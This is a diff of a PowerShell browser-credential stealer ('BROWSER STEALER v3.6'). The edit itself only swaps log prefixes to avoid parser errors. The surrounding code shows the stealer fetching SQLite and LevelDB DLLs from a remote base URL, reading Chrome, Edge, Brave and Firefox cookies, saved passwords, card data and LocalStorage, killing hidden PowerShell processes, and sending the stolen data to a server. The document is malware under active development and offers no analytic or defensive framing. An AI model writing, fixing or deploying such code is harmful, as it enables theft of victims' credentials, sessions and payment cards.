@@ -1,8 +1,8 @@
 # ============================================================
-# BROWSER STEALER v3.5 — FULLY FIXED
+# BROWSER STEALER v3.6 — NO PARSER ERRORS
 # Sends: Cookies, Passwords, Cards, LocalStorage
 # WMI cleanup — kills previous hidden PowerShell processes
-# No parser errors — escaped exclamation marks
+# NO exclamation marks in strings — safe for all PowerShell versions
 # No Read-Host — exits cleanly
 # ============================================================
 
@@ -38,7 +38,7 @@ function Write-Log {
 }
 
 Write-Log "============================================"
-Write-Log "  BROWSER STEALER v3.5 — SERVER-ONLY"
+Write-Log "  BROWSER STEALER v3.6"
 Write-Log "  Target: $env:COMPUTERNAME"
 Write-Log "  Log: $LOGFILE"
 Write-Log "  Base URL: $BASE_URL"
@@ -65,7 +65,7 @@ try {
                 Write-Log "  [+] Killed hidden process: PID $pid"
                 $killed++
             } catch {
-                Write-Log "  [!] Failed to kill PID $pid"
+                Write-Log "  [*] Failed to kill PID $pid"
             }
         }
     }
@@ -77,7 +77,7 @@ try {
         Write-Log "[+] No hidden processes found"
     }
 } catch {
-    Write-Log "[!] WMI cleanup failed: $_"
+    Write-Log "[*] WMI cleanup failed: $_"
 }
 
 Write-Log ""
@@ -97,7 +97,7 @@ function Download-Dll {
         Write-Log "[+] $Name downloaded successfully ($($response.Content.Length) bytes)"
         return $true
     } catch {
-        Write-Log "[!] $Name download failed: $_"
+        Write-Log "[*] $Name download failed: $_"
         return $false
     }
 }
@@ -107,7 +107,7 @@ $sqlitePath = "$DLL_DIR\System.Data.SQLite.dll"
 $sqliteOk = Download-Dll -Url $SQLITE_DLL_URL -Path $sqlitePath -Name "SQLite DLL"
 
 if (-not $sqliteOk -or -not (Test-Path $sqlitePath)) {
-    Write-Log "[!] SQLite DLL required — exiting"
+    Write-Log "[*] SQLite DLL required — exiting"
     exit
 }
 
@@ -125,7 +125,7 @@ if ($leveldbOk -and $nativeOk -and (Test-Path $leveldbPath) -and (Test-Path $lev
     Write-Log "[+] LevelDB DLLs available"
     $leveldbLoaded = $true
 } else {
-    Write-Log "[!] LevelDB not available — LocalStorage for Chrome/Edge/Brave will be skipped"
+    Write-Log "[*] LevelDB not available — LocalStorage for Chrome/Edge/Brave will be skipped"
 }
 
 # ============================================================
@@ -137,7 +137,7 @@ try {
     [System.Reflection.Assembly]::LoadFrom($sqlitePath) | Out-Null
     Write-Log "[+] SQLite loaded successfully!"
 } catch {
-    Write-Log "[!] Failed to load SQLite DLL: $_"
+    Write-Log "[*] Failed to load SQLite DLL: $_"
     exit
 }
 
@@ -148,7 +148,7 @@ try {
     $testConn.Close()
     Write-Log "[+] SQLite test passed!"
 } catch {
-    Write-Log "[!] SQLite test failed: $_"
+    Write-Log "[*] SQLite test failed: $_"
     exit
 }
 
@@ -162,11 +162,11 @@ if ($leveldbLoaded) {
         [System.Reflection.Assembly]::LoadFrom($leveldbPath) | Out-Null
         Write-Log "[+] LevelDB loaded successfully!"
     } catch {
-        Write-Log "[!] Failed to load LevelDB: $_"
+        Write-Log "[*] Failed to load LevelDB: $_"
         $leveldbLoaded = $false
     }
 } else {
-    Write-Log "[!] LevelDB DLLs not available — skipping Chrome/Edge/Brave LocalStorage"
+    Write-Log "[*] LevelDB DLLs not available — skipping Chrome/Edge/Brave LocalStorage"
 }
 
 # ============================================================
@@ -199,7 +199,7 @@ function Read-SQLite {
         $conn.Close()
         Remove-Item $temp -Force -ErrorAction SilentlyContinue
     } catch {
-        Write-Log "[!] SQLite error"
+        Write-Log "[*] SQLite error"
     }
     return $result
 }
@@ -256,7 +256,7 @@ function Get-BrowserCookies {
             }
         }
     } catch {
-        Write-Log "[!] Error reading $Name cookies"
+        Write-Log "[*] Error reading $Name cookies"
     }
     return $cookies
 }
@@ -284,7 +284,7 @@ function Get-FirefoxCookies {
                         }
                     }
                 } catch {
-                    Write-Log "[!] Error reading Firefox cookies"
+                    Write-Log "[*] Error reading Firefox cookies"
                 }
             }
         }
@@ -311,7 +311,7 @@ function Get-FirefoxLocalStorage {
             }
             Write-Log "[+] Firefox LocalStorage: $($storage.Count) items"
         } catch {
-            Write-Log "[!] Error reading Firefox LocalStorage"
+            Write-Log "[*] Error reading Firefox LocalStorage"
         }
     }
     return $storage
@@ -353,7 +353,7 @@ function Get-ChromeLocalStorage {
         
         Write-Log "[+] $Name LocalStorage: $($storage.Count) items"
     } catch {
-        Write-Log "[!] Error reading $Name LocalStorage: $_"
+        Write-Log "[*] Error reading $Name LocalStorage: $_"
     }
     
     return $storage
@@ -404,7 +404,7 @@ function Get-BrowserPasswords {
         
         Write-Log "[+] Found $($pass.Count) $Name passwords"
     } catch {
-        Write-Log "[!] Error reading $Name passwords: $_"
+        Write-Log "[*] Error reading $Name passwords: $_"
     }
     return $pass
 }
@@ -434,7 +434,7 @@ function Get-FirefoxPasswords {
                         }
                     }
                 } catch {
-                    Write-Log "[!] Error reading Firefox passwords"
+                    Write-Log "[*] Error reading Firefox passwords"
                 }
             }
         }
@@ -476,7 +476,7 @@ function Get-BrowserCards {
             }
         }
     } catch {
-        Write-Log "[!] Error reading $Name cards"
+        Write-Log "[*] Error reading $Name cards"
     }
     return $cards
 }
@@ -643,7 +643,7 @@ if ($allLocalStorage.Count -gt 0) {
 }
 
 if ($allCookies.Count -eq 0 -and $allPasswords.Count -eq 0 -and $allCards.Count -eq 0 -and $allLocalStorage.Count -eq 0) {
-    Write-Log "[!] No data stolen"
+    Write-Log "[*] No data stolen"
     Write-Log "[*] Possible reasons:"
     Write-Log "   - No saved data in browsers"
     Write-Log "   - Browser is running (locks the database)"
@@ -719,7 +719,7 @@ try {
     $resp.Close()
     Write-Log "[+] Data sent successfully!"
 } catch {
-    Write-Log "[!] Failed to send: $_"
+    Write-Log "[*] Failed to send: $_"
 }
 
 # ============================================================
